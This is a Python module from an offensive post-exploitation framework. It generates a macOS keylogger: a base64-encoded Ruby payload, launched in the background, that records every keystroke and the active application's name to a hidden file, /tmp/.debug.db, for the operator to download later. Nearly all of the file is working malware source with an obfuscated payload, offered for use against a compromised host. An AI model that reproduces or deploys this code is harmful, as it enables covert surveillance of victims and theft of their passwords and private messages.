class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Keylogger',

            # list of one or more authors for the module
            'Author': ['joev', '@harmj0y', '@Salbei_'],

            # more verbose multi-line description of the module
            'Description': ("Logs keystrokes to the specified file. Ruby based and heavily adapted from MSF's osx/capture/keylog_recorder. Kill the resulting PID when keylogging is finished and download the specified LogFile."),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "",

            # if the module needs administrative privileges
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                "https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.rb"
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to keylog.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LogFile': {
                'Description'   :   'Text file to log keystrokes out to.',
                'Required'      :   True,
                'Value'         :   '/tmp/.debug.db'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        logFile = self.options['LogFile']['Value']

        # base64'ed launcher of ./data/misc/keylogger.rb from MSF
        script = """
import os,time
output = os.popen('echo "require \\\'base64\\\';eval(Base64.decode64(\\\'ZGVmIHJ1YnlfMV85X29yX2hpZ2hlcj8NCiAgUlVCWV9WRVJTSU9OLnRvX2YgPj0gMS45ICYmIFJVQllfVkVSU0lPTi50b19mPDIuMw0KZW5kDQpkZWYgcnVieV8yXzNfb3JfaGlnaGVyPw0KICBSVUJZX1ZFUlNJT04udG9fZiA+PSAyLjMNCmVuZA0KcmVxdWlyZSAndGhyZWFkJw0KcmVxdWlyZSAnZmlkZGxlJyBpZiBydWJ5XzJfM19vcl9oaWdoZXI/DQpyZXF1aXJlICdmaWRkbGUvaW1wb3J0JyBpZiBydWJ5XzJfM19vcl9oaWdoZXI/DQpyZXF1aXJlICdkbCcgaWYgbm90IHJ1YnlfMl8zX29yX2hpZ2hlcj8NCnJlcXVpcmUgJ2RsL2ltcG9ydCcgaWYgbm90IHJ1YnlfMl8zX29yX2hpZ2hlcj8NCkltcG9ydGVyID0gaWYgZGVmaW5lZD8oREw6OkltcG9ydGVyKSB0aGVuIGV4dGVuZCBETDo6SW1wb3J0ZXIgZWxzaWYgZGVmaW5lZD8oRmlkZGxlOjpJbXBvcnRlcikgdGhlbiBleHRlbmQgRmlkZGxlOjpJbXBvcnRlciBlbHNlIERMOjpJbXBvcnRhYmxlIGVuZA0KZGVmIG1hbGxvY3Moc2l6ZSkNCiAgaWYgcnVieV8yXzNfb3JfaGlnaGVyPw0KICAgIEZpZGRsZTo6UG9pbnRlci5tYWxsb2Moc2l6ZSkNCiAgZWxzaWYgcnVieV8xXzlfb3JfaGlnaGVyPyANCiAgICBETDo6Q1B0ci5tYWxsb2Moc2l6ZSkNCiAgZWxzZQ0KICAgIERMOjptYWxsb2Moc2l6ZSkNCiAgZW5kDQplbmQNCmlmIG5vdCBydWJ5XzFfOV9vcl9oaWdoZXI/DQogIG1vZHVsZSBETA0KICAgIG1vZHVsZSBJbXBvcnRhYmxlDQogICAgICBkZWYgbWV0aG9kX21pc3NpbmcobWV0aCwgKmFyZ3MsICZibG9jaykNCiAgICAgICAgc3RyID0gbWV0aC50b19zDQogICAgICAgIGxvd2VyID0gc3RyWzAsMV0uZG93bmNhc2UgKyBzdHJbMS4uLTFdDQogICAgICAgIGlmIHNlbGYucmVzcG9uZF90bz8gbG93ZXINCiAgICAgICAgICBzZWxmLnNlbmQgbG93ZXIsICphcmdzDQogICAgICAgIGVsc2UNCiAgICAgICAgICBzdXBlcg0KICAgICAgICBlbmQNCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCmVuZA0KU01fS0NIUl9DQUNIRSA9IDM4DQpTTV9DVVJSRU5UX1NDUklQVCA9IC0yDQpNQVhfQVBQX05BTUUgPSA4MA0KbW9kdWxlIENhcmJvbg0KICBpZiBydWJ5XzJfM19vcl9oaWdoZXI/DQogICAgZXh0ZW5kIEZpZGRsZTo6SW1wb3J0ZXINCiAgZWxzZQ0KICAgIGV4dGVuZCBETDo6SW1wb3J0ZXINCiAgZW5kDQogIGRsbG9hZCAnL1N5c3RlbS9MaWJyYXJ5L0ZyYW1ld29ya3MvQ2FyYm9uLmZyYW1ld29yay9DYXJib24nDQogIGV4dGVybiAndW5zaWduZWQgbG9uZyBDb3B5UHJvY2Vzc05hbWUoY29uc3QgUHJvY2Vzc1NlcmlhbE51bWJlciAqLCB2b2lkICopJw0KICBleHRlcm4gJ3ZvaWQgR2V0RnJvbnRQcm9jZXNzKFByb2Nlc3NTZXJpYWxOdW1iZXIgKiknDQogIGV4dGVybiAndm9pZCBHZXRLZXlzKHZvaWQgKiknDQogIGV4dGVybiAndW5zaWduZWQgY2hhciAqR2V0U2NyaXB0VmFyaWFibGUoaW50LCBpbnQpJw0KICBleHRlcm4gJ3Vuc2lnbmVkIGNoYXIgS2V5VHJhbnNsYXRlKHZvaWQgKiwgaW50LCB2b2lkICopJw0KICBleHRlcm4gJ3Vuc2lnbmVkIGNoYXIgQ0ZTdHJpbmdHZXRDU3RyaW5nKHZvaWQgKiwgdm9pZCAqLCBpbnQsIGludCknDQogIGV4dGVybiAnaW50IENGU3RyaW5nR2V0TGVuZ3RoKHZvaWQgKiknDQplbmQNCnBzbiA9IG1hbGxvY3MoMTYpDQpuYW1lID0gbWFsbG9jcygxNikNCm5hbWVfY3N0ciA9IG1hbGxvY3MoTUFYX0FQUF9OQU1FKQ0Ka2V5bWFwID0gbWFsbG9jcygxNikNCnN0YXRlID0gbWFsbG9jcyg4KQ0KaXR2X3N0YXJ0ID0gVGltZS5ub3cudG9faQ0KcHJldl9kb3duID0gSGFzaC5uZXcoZmFsc2UpDQpsYXN0V2luZG93ID0gIiINCndoaWxlICh0cnVlKSBkbw0KICBDYXJib24uR2V0RnJvbnRQcm9jZXNzKHBzbi5yZWYpDQogIENhcmJvbi5Db3B5UHJvY2Vzc05hbWUocHNuLnJlZiwgbmFtZS5yZWYpDQogIENhcmJvbi5HZXRLZXlzKGtleW1hcCkNCiAgc3RyX2xlbiA9IENhcmJvbi5DRlN0cmluZ0dldExlbmd0aChuYW1lKQ0KICBjb3BpZWQgPSBDYXJib24uQ0ZTdHJpbmdHZXRDU3RyaW5nKG5hbWUsIG5hbWVfY3N0ciwgTUFYX0FQUF9OQU1FLCAweDA4MDAwMTAwKSA+IDANCiAgYXBwX25hbWUgPSBpZiBjb3BpZWQgdGhlbiBuYW1lX2NzdHIudG9fcyBlbHNlICdVbmtub3duJyBlbmQNCiAgYnl0ZXMgPSBrZXltYXAudG9fc3RyDQogIGNhcF9mbGFnID0gZmFsc2UNCiAgYXNjaWkgPSAwDQogIGN0cmxjaGFyID0gIiINCiAgKDAuLi4xMjgpLmVhY2ggZG8gfGt8DQogICAgaWYgKChieXRlc1trPj4zXS5vcmQgPj4gKGsmNykpICYgMSA+IDApDQogICAgICBpZiBub3QgcHJldl9kb3duW2tdDQogICAgICAgIGNhc2Ugaw0KICAgICAgICAgIHdoZW4gMzYNCiAgICAgICAgICAgIGN0cmxjaGFyID0gIltlbnRlcl0iDQogICAgICAgICAgd2hlbiA0OA0KICAgICAgICAgICAgY3RybGNoYXIgPSAiW3RhYl0iDQogICAgICAgICAgd2hlbiA0OQ0KICAgICAgICAgICAgY3RybGNoYXIgPSAiICINCiAgICAgICAgICB3aGVuIDUxDQogICAgICAgICAgICBjdHJsY2hhciA9ICJbZGVsZXRlXSINCiAgICAgICAgICB3aGVuIDUzDQogICAgICAgICAgICBjdHJsY2hhciA9ICJbZXNjXSINCiAgICAgICAgICB3aGVuIDU1DQogICAgICAgICAgICBjdHJsY2hhciA9ICJbY21kXSINCiAgICAgICAgICB3aGVuIDU2DQogICAgICAgICAgICBjdHJsY2hhciA9ICJbc2hpZnRdIg0KICAgICAgICAgIHdoZW4gNTcNCiAgICAgICAgICAgIGN0cmxjaGFyID0gIltjYXBzXSINCiAgICAgICAgICB3aGVuIDU4DQogICAgICAgICAgICBjdHJsY2hhciA9ICJbb3B0aW9uXSINCiAgICAgICAgICB3aGVuIDU5DQogICAgICAgICAgICBjdHJsY2hhciA9ICJbY3RybF0iDQogICAgICAgICAgd2hlbiA2Mw0KICAgICAgICAgICAgY3RybGNoYXIgPSAiW2ZuXSINCiAgICAgICAgICBlbHNlDQogICAgICAgICAgICBjdHJsY2hhciA9ICIiDQogICAgICAgIGVuZA0KICAgICAgICBpZiBjdHJsY2hhciA9PSAiIiBhbmQgYXNjaWkgPT0gMA0KICAgICAgICAgIGtjaHIgPSBDYXJib24uR2V0U2NyaXB0VmFyaWFibGUoU01fS0NIUl9DQUNIRSwgU01fQ1VSUkVOVF9TQ1JJUFQpDQogICAgICAgICAgY3Vycl9hc2NpaSA9IENhcmJvbi5LZXlUcmFuc2xhdGUoa2Nociwgaywgc3RhdGUpDQogICAgICAgICAgY3Vycl9hc2NpaSA9IGN1cnJfYXNjaWkgPj4gMTYgaWYgY3Vycl9hc2NpaSA8IDENCiAgICAgICAgICBwcmV2X2Rvd25ba10gPSB0cnVlDQogICAgICAgICAgaWYgY3Vycl9hc2NpaSA9PSAwDQogICAgICAgICAgICBjYXBfZmxhZyA9IHRydWUNCiAgICAgICAgICBlbHNlDQogICAgICAgICAgICBhc2NpaSA9IGN1cnJfYXNjaWkNCiAgICAgICAgICBlbmQNCiAgICAgICAgZWxzaWYgY3RybGNoYXIgIT0gIiINCiAgICAgICAgICBwcmV2X2Rvd25ba10gPSB0cnVlDQogICAgICAgIGVuZA0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgcHJldl9kb3duW2tdID0gZmFsc2UNCiAgICBlbmQNCiAgZW5kDQogIGlmIGFzY2lpICE9IDAgb3IgY3RybGNoYXIgIT0gIiINCiAgICBpZiBhcHBfbmFtZSAhPSBsYXN0V2luZG93DQogICAgICBwdXRzICJcblxuWyN7YXBwX25hbWV9XSAtIFsje1RpbWUubm93fV1cbiINCiAgICAgIGxhc3RXaW5kb3cgPSBhcHBfbmFtZQ0KICAgIGVuZA0KICAgIGlmIGN0cmxjaGFyICE9ICIiDQogICAgICBwcmludCAiI3tjdHJsY2hhcn0iDQogICAgZWxzaWYgYXNjaWkgPiAzMiBhbmQgYXNjaWkgPCAxMjcNCiAgICAgIGMgPSBpZiBjYXBfZmxhZyB0aGVuIGFzY2lpLmNoci51cGNhc2UgZWxzZSBhc2NpaS5jaHIgZW5kDQogICAgICBwcmludCAiI3tjfSINCiAgICBlbHNlDQogICAgICBwcmludCAiWyN7YXNjaWl9XSINCiAgICBlbmQNCiAgICAkc3Rkb3V0LmZsdXNoDQogIGVuZA0KICBLZXJuZWwuc2xlZXAoMC4wMSkNCmVuZA0KDQo=\\\'))" | ruby > %s 2>&1 &').read()
time.sleep(1)
pids = os.popen('ps aux | grep " ruby" | grep -v grep').read()
print pids
print "kill ruby PID and download %s when completed"
""" % (logFile, logFile)

        return script
